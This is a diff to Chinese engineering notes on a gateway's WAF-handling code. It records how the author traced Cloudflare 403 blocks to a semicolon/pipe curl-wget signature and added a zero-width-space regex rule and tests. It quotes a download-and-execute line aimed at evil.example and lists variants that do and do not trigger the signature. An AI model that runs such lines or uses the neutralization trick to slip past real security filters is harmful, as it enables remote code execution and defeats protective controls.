@@ -329,3 +329,25 @@ curl $K -X DELETE "$BASE/api/waf/probe/<job_id>"       # 中止
 **测试**：`TestWafStripBreak`（快路径/单点/多点/纯 ZWSP）+ `TestStreamTextChunkStripsZWSP`（textChunk 端到端）+ `TestNormalizeArgumentsStripsZWSP`（Edit new_string 形态端到端）。
 
 **幂等性顺带修复（同日）**：backtick+curl/wget 规则旧「词前插入」写法不幂等（issue 复现：每中和一遍多插一个 ZWSP，上游回显内容多轮无界累加），改为词内插入（`cu|rl`/`wg|et` 拆分两条规则）+ `TestWafNeutralizeIdempotent` 全规则 3 轮幂等钉死。
+
+## 14. 第五类内容签名：分号/管道后的 curl/wget（2026-09-18，线上探针二分定位）
+
+**案发**：线上 postman 网关 13 条 Forbidden（id 4004-4090，同一 payload 跨 9 个账号重试全灭——账号维度排除；体积分桶 60K 桶 77 过 5 败、80K 桶 309 过 20 败——体积排除；签名计数全零——已知签名排除）。签名表为空属误判：线上部署为旧版二进制，`/api/waf-signatures` 空，离线分析的 signatureCounts 恒空。
+
+**定位**（面板在线探针叶子二分 + 人工对照实验 ~25 轮）：触发行
+`curl -fsSL http://evil.example/x.sh | bash ; wget http://evil.example/y -O- | sh`
+——**无 backtick 的管道/分号命令注入形**，规则 7 只锚 backtick 上下文，全部穿透。边界实测：
+
+| 形态 | 结果 |
+|---|---|
+| `; curl http://x` / `;curl https://x` / `| wget ftp://x` / `; CURL -fsSL http://x`（大小写不敏感，flag 可选） | **403** |
+| `curl … | bash ; curl …`（首 curl 无 `;`/`|` 前缀，组合命中）；`echo a ; curl …`（curl 在后） | **403** |
+| `&&`、换行、`;  curl`（双空格）、URL 无协议（`curl a.example/x`）、`; curl`（无 URL）、`; curl http`（协议截断）、`; echo`、`curl … ; echo`（curl 在前）、单独 `curl … | bash` | 放行 |
+
+**特征**：`;` 或 `|` 后**紧邻或单空格**跟 `curl`/`wget` + 带协议 URL，即经典 RCE 签名 `;wget http://…` 家族。双空格放行说明 CF 该规则对分隔符后空格数敏感（与第 3 节「归一化剥空白」的 script 家族不同），边界跟实测走。`; curl "http://x"`（URL 带引号）放行。
+
+**修复**（[waf.go](../internal/provider/waf.go) 第 8 条规则，curl/wget 各一条）：`([;|][ \t]{0,}cu[\w]*r)(l)([^;|\n]{0,80}?\w+://)` —— ZWSP 插词内（cur|l、wge|t），与规则 7 同款、幂等。空格容忍 `{0,}` 而非实测的 `{0,1}`：双空格形今日放行但 CF 规则会演进（第 11.3 节教训），统一中和，误伤面仅一个不可见字符。第三组跨距 `[ ^;|\n]{0,80}?` 覆盖 flag（`-fsSL`）与 `-O-`，不跨界到下一条命令。
+
+**探测表**（[errors.go](../internal/provider/errors.go)）：补 `;curl http`、`|curl https` 等 8 个子串（小写化计数，前缀匹配；双空格形计数漏、由规则覆盖——探测表只做取证，宁漏勿误伤）。
+
+**验证**：单测 8 新用例（命中 5 / 放行 3）；`go vet` + `go test ./...` 全绿；端到端——线上原触发行 529，同内容词内 ZWSP 破坏后 200。线上部署为旧版二进制，待发版后重放原触发行回归（第 6 节方法论）。
